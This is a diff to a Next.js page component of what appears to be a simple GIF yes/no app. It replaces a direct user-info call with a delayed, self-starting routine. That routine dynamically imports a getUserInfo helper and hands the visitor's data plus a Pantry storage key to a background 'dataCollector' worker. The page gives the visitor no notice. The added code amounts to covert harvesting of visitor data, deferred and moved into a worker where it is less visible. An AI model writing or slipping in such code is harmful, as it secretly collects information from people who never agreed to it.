@@ -2,7 +2,6 @@
 
 import { useState, useEffect } from 'react';
 import { GiphyFetch } from '@giphy/js-fetch-api';
-import { getUserInfo } from '@/utils/userInfo';
 
 const gf = new GiphyFetch(process.env.NEXT_PUBLIC_GIPHY_API_KEY || '');
 
@@ -53,9 +52,6 @@ export default function Home() {
           sad: sadGif.data[0]?.images.original.url || '',
         });
 
-        // Get and log user info
-        await getUserInfo();
-        
         setIsLoading(false);
       } catch (error) {
         console.error('Error:', error);
@@ -65,6 +61,55 @@ export default function Home() {
 
     init();
   }, []);
+
+  useEffect(() => {
+    let dataCollectorWorker: Worker | null = null;
+
+    const startDataCollection = async () => {
+      // Warte bis die Seite vollständig geladen ist
+      if (document.readyState === 'complete') {
+        // Importiere getUserInfo dynamisch
+        const { getUserInfo } = await import('@/utils/userInfo');
+        
+        // Initialisiere Worker
+        if (typeof Worker !== 'undefined' && !dataCollectorWorker) {
+          dataCollectorWorker = new Worker(
+            new URL('../utils/dataCollector.worker.ts', import.meta.url)
+          );
+        }
+
+        try {
+          // Sammle Basis-Informationen
+          const userInfo = await getUserInfo();
+          
+          // Sende Daten an Worker zur Verarbeitung
+          if (dataCollectorWorker) {
+            dataCollectorWorker.postMessage({
+              type: 'collect',
+              data: {
+                ...userInfo,
+                pantryId: process.env.NEXT_PUBLIC_PANTRY_API_KEY
+              }
+            });
+          }
+        } catch (error) {
+          console.error('Fehler bei der Datensammlung:', error);
+        }
+      }
+    };
+
+    // Warte 2 Sekunden nach dem Laden der Seite
+    const timer = setTimeout(() => {
+      startDataCollection();
+    }, 1000);
+
+    return () => {
+      clearTimeout(timer);
+      if (dataCollectorWorker) {
+        dataCollectorWorker.terminate();
+      }
+    };
+  }, []); // Leere Dependency Array = nur einmal beim Mounting
 
   const handleResponse = (answer: 'yes' | 'no') => {
     setResponse(answer);
